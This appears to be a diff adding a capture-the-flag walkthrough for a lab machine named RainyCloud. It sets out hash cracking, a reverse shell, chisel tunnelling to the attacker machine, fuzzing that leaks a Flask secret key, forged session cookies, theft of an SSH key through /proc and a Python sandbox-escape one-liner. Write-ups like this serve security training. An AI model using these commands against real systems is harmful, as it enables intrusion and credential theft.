@@ -1,0 +1,64 @@
+Start with some foothold and found directories and subdomains:
+Directories:
+	/api/
+	/api/user/1.0
+	/api/user/2.0
+	/api/user/3.0
+	/login
+	/logut
+	/new/register
+
+Subdomains:
+	dev.rainycloud.htb
+
+In the /api/user/3.0 there's a hash password that can be cracked
+# hashcat -m 3200 hash.txt /home/user/Extra-tools/rockyou.txt
+gary:rubberducky
+
+Once logged in you can execute a reverse shell in one container by running a command on the "Execute Command(background)"
+(You can use this website to generate a python3 payload)
+# https://www.revshells.com/
+
+After that execute chisel to get TCP tunnel
+
+On the reverse shell:
+# ./chisel client --max-retry-count=1 $IP:$PORT R:$PORT_FORWARDING
+On the attacker machine:
+# chisel server --port $PORT
+
+Modify the /etc/proxychains.conf and scan for the ip of the dev subdomain
+# for p in {1..1024}; do proxychains -q nc -vn 172.18.0.1 $p -w 1 -z & done 2> output.txt
+
+After that change the chisel command reverse shell to the next one
+# ./chisel client --max-retry-count=1 $IP:$PORT R:$PORT_FORWARDING:172.18.0.1:80
+
+And add it to /etc/hosts the following:
+# 127.0.0.1	dev.rainycloud.htb
+
+The next thing to do is search for a secret-key to change to jack user
+So in the /api/healthcheck directory that supports POST method and parameters can be found visiting the endpoint
+We have to fuzz it
+
+# wfuzz -z file,/usr/share/wordlists/dirb/common.txt -b 'session=session_cookie' -d 'file=/var/www/rainycloud/FUZZ.py&type=custom&pattern=^SECRET_KEY.*' --hc 500 http://dev.rainycloud.htb:8888/api/healthcheck 
+The next thing to do is to execute the exploit.py file to get the full secret key
+
+secret key: f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67
+
+With this just use flask-session-cookie-manager to craft a cookie that let us in like jack user
+Execute a RV in the container and then executing "pspy64s" you'll find that there is a 'sleep' process running
+Access to that file and there you'll find the id_rsa of the user :D
+
+# cat /proc/$PID/root/home/jack/.ssh/id_rsa
+
+Running 'sudo -l' i found that there is a file that can be executed to change to jack_adm user (python sandbox escape)
+# echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))' > /tmp/exploit && sudo -u jack_adm /usr/bin/safe_python /tmp/exploit
+
+Doing this thing again with jack_adm user i found another file called 'hash_password.py'
+If i executed it without providing a string i still get a hash, so time to crack it
+# hashcat -m 3200 hash-root.txt SecLists/Passwords/Leaked-Databases/md5decryptor-uk.txt
+
+
+
+
+Tools used:
+	flask-session-cookie-manager
